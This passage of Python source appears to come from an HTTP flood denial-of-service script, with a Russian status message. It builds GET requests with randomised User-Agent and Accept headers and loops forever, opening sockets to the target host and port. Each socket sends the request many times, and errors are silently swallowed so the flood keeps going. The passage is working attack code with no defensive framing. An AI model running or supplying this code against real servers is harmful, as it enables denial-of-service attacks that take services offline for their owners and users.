    useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
    accept = random.choice(acceptall)
    request = get_host + useragent + accept + connection + "\r\n"
    go.wait()
    while True:
      try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((str(url2), int(urlport)))
        s.send (str.encode(request))
        print ("[*] Пакет отправлен!")
        try:
          for y in range(multiple):
            s.send(str.encode(request))
        except:
          s.close()
      except:
        s.close()
main()